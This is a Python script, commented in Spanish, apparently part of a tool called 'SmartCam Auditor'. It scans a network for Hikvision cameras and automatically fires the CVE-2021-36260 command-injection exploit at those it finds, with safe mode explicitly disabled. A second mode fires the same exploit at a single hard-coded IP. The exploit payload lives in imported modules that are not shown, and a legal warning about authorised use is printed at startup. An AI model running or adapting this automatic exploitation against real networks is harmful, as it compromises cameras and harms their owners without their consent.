#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SmartCam Auditor - Scanner Integral con Exploit Automático CVE-2021-36260
Integra escaneo de red + detección CVE + exploit automático
"""

import sys
import os
import json
import time

# Agregar el directorio padre al path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

def scan_and_exploit_hikvision():
    """
    Escanea la red en busca de dispositivos Hikvision y aplica exploit CVE-2021-36260 automáticamente
    """
    print("🚀 SmartCam Auditor - Scanner y Exploit Automático")
    print("=" * 60)
    print("Funcionalidad integrada: Scan → Detect → CVE → Exploit")
    print()
    
    try:
        # Importar módulos necesarios
        from scanner.network_scanner import NetworkScanner
        from scanner.exploit_launcher import ExploitLauncher
        
        # Configurar scanner con exploits automáticos habilitados
        config = {
            "auto_check_cves": True,
            "auto_launch_exploits": True,
            "exploit_safe_mode": False,  # Modo real
            "enable_cve_check": True,
            "scan_settings": {
                "timeout": 2.0,
                "max_threads": 20
            },
            "camera_ports": [80, 8080, 443, 8000, 8081],
            "network_range": "192.168.1.0/24"  # Ajustar según tu red
        }
        
        # Guardar configuración temporal
        config_file = "config/scan_exploit_config.json"
        with open(config_file, "w", encoding='utf-8') as f:
            json.dump(config, f, indent=2, ensure_ascii=False)
        
        print("📋 Configuración:")
        print(f"   Red objetivo: {config['network_range']}")
        print(f"   Modo exploit: {'Real' if not config['exploit_safe_mode'] else 'Simulado'}")
        print(f"   CVE check: {'Habilitado' if config['auto_check_cves'] else 'Deshabilitado'}")
        print(f"   Auto exploit: {'Habilitado' if config['auto_launch_exploits'] else 'Deshabilitado'}")
        print()
        
        # Inicializar scanner
        print("🔍 Inicializando scanner avanzado...")
        scanner = NetworkScanner(config_file=config_file)
        
        # Ejecutar escaneo completo
        print("🌐 Iniciando escaneo de red...")
        start_time = time.time()
        
        devices = scanner.scan_network(config['network_range'])
        
        scan_duration = time.time() - start_time
        
        if not devices:
            print("❌ No se encontraron dispositivos en la red")
            return
        
        print(f"\n📊 RESULTADOS DEL ESCANEO ({scan_duration:.2f}s):")
        print("=" * 50)
        
        # Analizar dispositivos encontrados
        hikvision_devices = []
        potential_cameras = []
        
        for device in devices:
            device_type = device.get('device_type', '').lower()
            ip = device.get('ip')
            open_ports = device.get('open_ports', [])
            
            print(f"📱 {ip}")
            print(f"   Tipo: {device.get('device_type', 'Unknown')}")
            print(f"   Puertos: {open_ports}")
            print(f"   Confianza: {device.get('confidence', 0)}%")
            
            # CVE information if available
            if device.get('cves_found'):
                print(f"   🚨 CVEs encontrados: {device.get('cve_count', 0)}")
                print(f"   🔴 CVEs críticos: {device.get('critical_cves', 0)}")
                print(f"   💥 CVEs explotables: {device.get('exploitable_cves', 0)}")
                
                # Mostrar CVEs específicos
                for cve_info in device['cves_found']:
                    cve_id = cve_info.get('cve')
                    if cve_id == 'CVE-2021-36260':
                        print(f"   🎯 CVE-2021-36260 detectado - Command Injection!")
            
            # Exploit results if available
            if device.get('exploits_executed'):
                print(f"   🚀 Exploits ejecutados: {device.get('exploit_count', 0)}")
                print(f"   ✅ Exploits exitosos: {device.get('successful_exploits', 0)}")
                
                # Mostrar detalles de exploits exitosos
                for exploit in device['exploits_executed']:
                    if exploit.get('resultado') == 'EXITOSO':
                        print(f"   💀 COMPROMETIDO: {exploit.get('cve')} - {exploit.get('detalle')}")
            
            # Risk level
            risk_level = device.get('risk_level', 'LOW')
            risk_emoji = {
                'LOW': '🟢',
                'MEDIUM': '🟡', 
                'HIGH': '🟠',
                'CRITICAL': '🔴',
                'COMPROMISED': '💀'
            }.get(risk_level, '⚪')
            
            print(f"   {risk_emoji} Nivel de riesgo: {risk_level}")
            print()
            
            # Categorizar dispositivos
            if 'hikvision' in device_type:
                hikvision_devices.append(device)
            elif 'camera' in device_type or device.get('confidence', 0) >= 70:
                potential_cameras.append(device)
        
        # Resumen de vulnerabilidades críticas
        critical_devices = [d for d in devices if d.get('critical_cves', 0) > 0]
        compromised_devices = [d for d in devices if d.get('risk_level') == 'COMPROMISED']
        
        print("🎯 RESUMEN DE SEGURIDAD:")
        print("=" * 30)
        print(f"Total dispositivos: {len(devices)}")
        print(f"Dispositivos Hikvision: {len(hikvision_devices)}")
        print(f"Posibles cámaras: {len(potential_cameras)}")
        print(f"Vulnerabilidades críticas: {len(critical_devices)}")
        print(f"Dispositivos comprometidos: {len(compromised_devices)}")
        
        if compromised_devices:
            print(f"\n💀 DISPOSITIVOS COMPROMETIDOS:")
            for device in compromised_devices:
                print(f"   🚨 {device['ip']} - {device.get('device_type', 'Unknown')}")
                for exploit in device.get('exploits_executed', []):
                    if exploit.get('resultado') == 'EXITOSO':
                        print(f"      → {exploit.get('cve')}: {exploit.get('detalle')}")
        
        return devices
        
    except ImportError as e:
        print(f"❌ Error importando módulos: {e}")
        print("💡 Verifica que todos los módulos estén disponibles")
        return None
        
    except Exception as e:
        print(f"❌ Error en escaneo integral: {e}")
        import traceback
        traceback.print_exc()
        return None

def manual_exploit_test():
    """
    Prueba manual del exploit contra un target específico
    """
    print("\n🎯 MODO MANUAL - Exploit Específico")
    print("=" * 40)
    
    # Target específico (ajustar según necesidad)
    target_ip = "192.168.1.10"
    target_port = 80
    
    try:
        from scanner.exploit_launcher import ExploitLauncher
        
        # Configurar para modo real
        config = {
            "exploit_safe_mode": False,
            "exploit_timeout": 10,
            "log_exploits": True
        }
        
        with open("config/manual_exploit.json", "w") as f:
            json.dump(config, f, indent=2)
        
        launcher = ExploitLauncher(config_file="config/manual_exploit.json")
        
        print(f"🎯 Target: {target_ip}:{target_port}")
        print(f"🧬 Exploit: CVE-2021-36260 (Hikvision Command Injection)")
        print()
        
        # Ejecutar exploit
        resultado = launcher.lanzar_exploit("CVE-2021-36260", target_ip, target_port)
        
        # Mostrar resultado detallado
        print("📊 RESULTADO DETALLADO:")
        print(json.dumps(resultado, indent=2, ensure_ascii=False))
        
        return resultado
        
    except Exception as e:
        print(f"❌ Error en exploit manual: {e}")
        return None

if __name__ == "__main__":
    print("🧪 SmartCam Auditor - Scanner Integral con Exploits")
    print("Detecta y explota automáticamente CVE-2021-36260 en dispositivos Hikvision")
    print()
    
    print("⚠️  ADVERTENCIA LEGAL:")
    print("   Este tool debe usarse SOLO en redes propias o con autorización explícita")
    print("   El uso no autorizado puede ser ilegal")
    print()
    
    # Opción de modo
    print("Selecciona modo de operación:")
    print("1. Scanner automático completo (escaneo + CVE + exploit)")
    print("2. Exploit manual contra target específico")
    print("3. Ambos")
    
    try:
        opcion = input("\nOpción (1/2/3): ").strip()
        
        if opcion in ['1', '3']:
            print("\n🚀 Ejecutando scanner automático...")
            devices = scan_and_exploit_hikvision()
        
        if opcion in ['2', '3']:
            print("\n🎯 Ejecutando exploit manual...")
            resultado = manual_exploit_test()
        
        print("\n✅ Ejecución completada!")
        
    except KeyboardInterrupt:
        print("\n⚠️ Ejecución cancelada por el usuario")
    except Exception as e:
        print(f"\n❌ Error: {e}")
    
    print("\n💡 Para más información, revisa los logs generados")
